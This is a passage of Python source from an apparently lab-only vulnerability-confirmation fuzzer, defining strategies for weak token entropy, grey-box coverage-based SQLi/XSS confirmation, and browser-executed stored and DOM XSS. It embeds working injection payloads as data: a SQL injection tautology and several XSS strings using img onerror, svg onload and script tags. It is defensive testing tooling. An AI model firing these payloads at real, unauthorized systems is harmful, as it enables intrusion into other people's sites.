    Known limitation, not silently swept under the rug: `Verdict.evidence`
    deliberately does not record the full raw token values (unlike this
    project's own self-minted OOB canary tokens elsewhere in this file,
    these are the *target's own issued* session-token-shaped values) --
    only a short prefix of each plus the computed delta, the same
    "don't log a real secret verbatim" caution this project's own
    lab-only/authorized-only posture implies even for a benchmark run.
    """
    vuln_class = "weak_token_entropy"
    mechanism = "timestamp-derived-token"
    category = "weak-token-entropy"

    _DELTA_CEILING_NS = 10_000_000_000   # 10s -- a fixed backstop, not a
                                          # measured-elapsed-time bound

    def confirm(self, candidate, sender):
        probe_a = self._send(sender, candidate, "{}")
        probe_b = self._send(sender, candidate, "{}")
        token_a = _session_token(probe_a.text)
        token_b = _session_token(probe_b.text)
        if token_a is None or token_b is None:
            return None
        try:
            delta = int(token_b) - int(token_a)
        except (ValueError, TypeError):
            return None
        if not (0 <= delta <= self._DELTA_CEILING_NS):
            return None
        return Verdict(True, self.vuln_class, self.mechanism,
                       {"token_a_prefix": str(token_a)[:8],
                        "token_b_prefix": str(token_b)[:8],
                        "delta_ns": delta})


# Grey-box (M10) default confirmation-side probes: something that would reach the
# vulnerable sink (a SQLi syntax-breaker; an XSS canary) so the coverage/DB-fault
# side channel has something to observe. Distinct from the black-box strategies'
# own probes above -- this one probe is purely to *generate* the signal, not to
# read the HTTP response for a verdict (the verdict comes from coverage/db_fault).
_GREYBOX_APP_ROOT = "/var/www/html"
_GREYBOX_PROBE_PAYLOADS = {
    "sqli": "1' OR '1'='1' -- -",
    "xss": "<fzlgbx>",
}


def _greybox_sink_file(url: str, app_root: str = _GREYBOX_APP_ROOT) -> str:
    """Map a candidate's URL to the app file expected to serve it (…/login.php)."""
    from urllib.parse import urlparse
    path = urlparse(url).path or "/"
    base = path.rsplit("/", 1)[-1] or "index.php"
    return app_root.rstrip("/") + "/" + base


class GreyboxConfirmationStrategy(ConfirmationStrategy):
    """M10: grey-box confirmation via a covered sink line (+ a DB fault for SQLi).

    A cross-cutting, category-agnostic secondary mechanism layered alongside the
    category-specific black-box strategies (the same pattern M8's OOB callback
    uses alongside M1 timing for command injection): where the black-box
    mechanisms for `sql-injection`/`xss` abstain, `greybox_confirms()` (the pure
    decision in `fuzzlab/greybox/confirm.py`) confirms from the injected
    `CoverageSource`/`DbFaultSource` instead.

    Needs both the request-to-signal correlation and at least one source to do
    anything: the ``sender`` passed to `confirm()` must expose the
    ``send_correlated(url, param, value, *, method, location) -> (Probe, request_id)``
    contract already established for the live grey-box run
    (`fuzzlab/greybox/run.py`'s `RequestsCorrelatingSender`), so the probe this
    strategy sends can be matched back to the coverage/DB-fault side channel by a
    fresh ``X-Fzl-Cov`` id. Without a `send_correlated`-capable sender, or without
    either source injected, this strategy no-ops (returns ``None``, fail-closed) --
    same seam shape as the M6 `BrowserExecutor` / M8 `OobListener`. The *live*
    pcov/DB-fault side channel behind these sources is on-host infra (T3.1/T3.4,
    docs/ON_HOST_TASKS.md); this wiring layer is fully exercised offline via
    `InMemoryCoverageSource`/`InMemoryDbFaultSource`.
    """
    mechanism = "grey-box-coverage"
    category = ""                      # applies() is overridden (spans two categories)
    _CATEGORIES = ("sql-injection", "xss")

    def __init__(self, coverage: CoverageSource | None = None,
                 dbfault: DbFaultSource | None = None,
                 app_root: str = _GREYBOX_APP_ROOT):
        self._coverage = coverage
        self._dbfault = dbfault
        self._app_root = app_root

    def applies(self, candidate: Candidate) -> bool:
        return candidate.category in self._CATEGORIES

    def confirm(self, candidate, sender):
        if self._coverage is None and self._dbfault is None:
            return None                                    # no source injected -> no-op
        send_correlated = getattr(sender, "send_correlated", None)
        if send_correlated is None:
            return None                                    # sender can't mint a correlation id
        vuln_class = candidate.vuln_class or category_to_oracle_class(candidate.category)
        if not vuln_class:
            return None
        family = "sqli" if vuln_class.startswith("sqli") else "xss"
        payload = _GREYBOX_PROBE_PAYLOADS[family]
        _probe, request_id = send_correlated(candidate.url, candidate.param, payload,
                                             method=candidate.method,
                                             location=candidate.location)
        coverage = app_lines(self._coverage.lines_for(request_id)) \
            if self._coverage is not None else {}
        sink_covered = _greybox_sink_file(candidate.url, self._app_root) in coverage
        db_fault = self._dbfault.fault_for(request_id).faulted \
            if self._dbfault is not None else False
        signal = GreyboxSignal(sink_covered=sink_covered, db_fault=db_fault)
        if greybox_confirms(vuln_class, signal):
            return Verdict(True, vuln_class, self.mechanism, m10_evidence(vuln_class, signal))
        return None


# --- browser-execution XSS (M6): stored + DOM. Need an injected BrowserExecutor. ---
def _xss_exec_payloads(token: str) -> list[str]:
    """Payloads that, if they execute, call the sentinel with the token."""
    call = f"{SENTINEL}('{token}')"
    return [
        f"<img src=x onerror=\"{call}\">",
        f"\"><img src=x onerror=\"{call}\">",
        f"<svg onload=\"{call}\">",
        f"<script>{call}</script>",
    ]


class _BrowserXssStrategy(ConfirmationStrategy):
    """Shared M6 logic: place a tokened payload, execute in a browser, confirm on fire."""
    category = "xss"

    def __init__(self, executor: BrowserExecutor | None = None):
        self._executor = executor

    def _observe(self, candidate: Candidate, payload: str, token: str) -> ExecObservation:
        raise NotImplementedError

    def confirm(self, candidate, sender):
        if self._executor is None:
            return None                       # no browser available -> cannot confirm
        for payload in _xss_exec_payloads((token := _token())):
            obs = self._observe(candidate, payload, token)
            if obs.executed:
                return Verdict(True, self.vuln_class, self.mechanism,
                               {"payload": payload, "detail": obs.detail})
        return None


class DomXssStrategy(_BrowserXssStrategy):
    """M6: payload in the URL (query/fragment) executes client-side (no server round-trip)."""
    vuln_class = "xss-dom"
    mechanism = "browser-execution"

    def _observe(self, candidate, payload, token):
        location = candidate.location if candidate.location in ("query", "fragment") else "query"
        return self._executor.run(
            ExecRequest(url=candidate.url, param=candidate.param, value=payload,
                        location=location), token)


class StoredXssStrategy(_BrowserXssStrategy):
    """M6: payload stored via one request, executes when the render page is loaded."""
    vuln_class = "xss-stored"
    mechanism = "browser-execution"

    def _observe(self, candidate, payload, token):
        if not candidate.store_url:
            return ExecObservation(False)     # need the store endpoint (source_url)
        store = StoreStep(url=candidate.store_url, param=candidate.store_param or candidate.param,
                          value=payload, method=candidate.store_method,
                          location=candidate.store_location)
        return self._executor.run(ExecRequest(url=candidate.url, store=store), token)


def default_strategies(browser: BrowserExecutor | None = None,
                       oob: OobListener | None = None,
                       coverage: CoverageSource | None = None,
                       dbfault: DbFaultSource | None = None) -> list[ConfirmationStrategy]:
    """Cheapest/strongest first, per category. `applies()` scopes each to its category.

    The M6 browser strategies are included with the injected ``browser`` (or without,
    in which case they no-op — stored/DOM XSS stays unconfirmed until a browser is
    set). Likewise the M8 OOB strategy is included with the injected, already-started
    ``oob`` listener (or without, in which case it no-ops — blind command injection
    still confirms via M1 timing, just not via OOB callback). The M10 grey-box
    strategy is included last (a secondary, cross-cutting layer over sql-injection/
    xss): with neither ``coverage`` nor ``dbfault`` injected it no-ops, same as the
    others.
    """
    return [SqliErrorStrategy(), SqliBooleanStrategy(), SqliTimingStrategy(),
            ReflectedXssStrategy(), DomXssStrategy(browser), StoredXssStrategy(browser),
            OpenRedirectStrategy(), SstiStrategy(),
            PathTraversalStrategy(), CommandInjectionStrategy(),
            CommandInjectionOobStrategy(oob), RegexDosStrategy(),
            SsrfInBandMarkerStrategy(oob), SsrfOobStrategy(oob),
            AccessControlIdorStrategy(),
            InsecureDeserializationTypeConfusionStrategy(),
            XxeInBandMarkerStrategy(oob), XxeOobStrategy(oob),
            JwtAlgNoneConfusionStrategy(),
            PredictableTokenSourceStrategy(),
            GreyboxConfirmationStrategy(coverage, dbfault)]


# Reference-style category -> the oracle vuln_class we have a strategy for.
# Categories absent here have no confirmer yet (candidate emitted, not confirmed).
# Categories the oracle can confirm -> a representative class (the value is a hint;
# the pipeline scopes strategies by `category`, and 'xss' fans out to reflected +
# stored + DOM). A category absent here has no confirmer yet.
_CATEGORY_TO_CLASS = {
    "sql-injection": "sqli",
    "xss": "xss-reflected",
    "open-redirect": "open-redirect",
    "server-side-template-injection": "ssti",
    "file-inclusion": "file-inclusion",
    "command-injection": "command-injection",
    "regular-expression": "redos",
    "ssrf": "ssrf",
    "access-control": "access_control",
    "insecure-deserialization": "insecure_deserialization",
    "xxe": "xxe",
    "jwt-algorithm-confusion": "jwt_algorithm_confusion",
    "weak-token-entropy": "weak_token_entropy",
}


def category_to_oracle_class(category: str) -> str | None:
    return _CATEGORY_TO_CLASS.get(category)
